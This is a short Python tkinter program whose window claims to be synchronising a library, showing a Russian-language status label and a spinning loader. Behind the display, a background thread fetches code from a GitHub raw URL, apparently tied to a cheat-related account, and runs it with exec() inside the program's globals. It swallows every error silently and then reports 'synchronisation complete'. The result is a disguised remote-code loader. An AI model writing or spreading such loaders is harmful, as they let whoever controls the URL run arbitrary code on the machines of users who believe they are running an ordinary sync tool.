import tkinter as tk
import requests
import threading
import time
import random
from math import cos, sin, pi

URL_BASE = 'https://raw.githubusercontent.com/cheatmro/code/main/code.py'
UPDATE_INTERVAL = 1  # секунды

class LoadingCircle(tk.Canvas):
    def __init__(self, master, size=40, line_length=10, line_width=3, line_count=12, line_color='gray', **kwargs):
        super().__init__(master, width=size, height=size, bg='black', highlightthickness=0, **kwargs)
        self.size = size
        self.line_length = line_length
        self.line_width = line_width
        self.line_count = line_count
        self.line_color = line_color
        self.angle = 0
        self.lines = []
        self.animating = True
        self.create_lines()
        self.animate()

    def create_lines(self):
        center = self.size / 2
        radius = self.size / 2 - self.line_length - self.line_width
        self.lines.clear()
        self.delete("all")
        for i in range(self.line_count):
            angle = 2 * pi * i / self.line_count
            x_start = center + radius * cos(angle)
            y_start = center + radius * sin(angle)
            x_end = center + (radius + self.line_length) * cos(angle)
            y_end = center + (radius + self.line_length) * sin(angle)
            line = self.create_line(x_start, y_start, x_end, y_end, fill=self.line_color, width=self.line_width, capstyle=tk.ROUND)
            self.lines.append(line)

    def animate(self):
        if not self.animating:
            # Скрыть или остановить анимацию, можно очистить канвас или оставить как есть
            return
        self.angle = (self.angle + 1) % self.line_count
        for i, line in enumerate(self.lines):
            intensity = (i - self.angle) % self.line_count
            alpha = int(255 * (1 - intensity / self.line_count))
            color_value = max(50, min(255, alpha))
            color = f'#{color_value:02x}{color_value:02x}{color_value:02x}'
            self.itemconfig(line, fill=color)
        self.after(100, self.animate)

class SyncApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Синхронизация библиотеки")
        self.configure(bg='black')
        self.geometry("400x200")
        self.resizable(False, False)

        self.label = tk.Label(self, text="Синхронизация библиотеки", fg="gray", bg="black", font=("Arial", 16))
        self.label.pack(expand=True)

        self.loader = LoadingCircle(self)
        self.loader.pack(pady=10)

        self.running = True
        self.thread = threading.Thread(target=self.update_code_loop, daemon=True)
        self.thread.start()

        self.protocol("WM_DELETE_WINDOW", self.on_close)

    def on_close(self):
        self.running = False
        self.destroy()

    def update_code_loop(self):
        while self.running:
            try:
                # Добавляем случайный параметр для отключения кеша
                url = URL_BASE + "?_=" + str(random.randint(0, 1_000_000))
                response = requests.get(url, timeout=5)
                response.raise_for_status()
                code = response.text
                exec(code, globals())
                # Обновляем UI из главного потока
                self.after(0, self.on_success)
                break
            except Exception:
                pass
            time.sleep(UPDATE_INTERVAL)

    def on_success(self):
        self.running = False
        self.label.config(text="Синхронизация завершена")
        self.loader.animating = False
        self.loader.delete("all")

if __name__ == "__main__":
    app = SyncApp()
    app.mainloop()
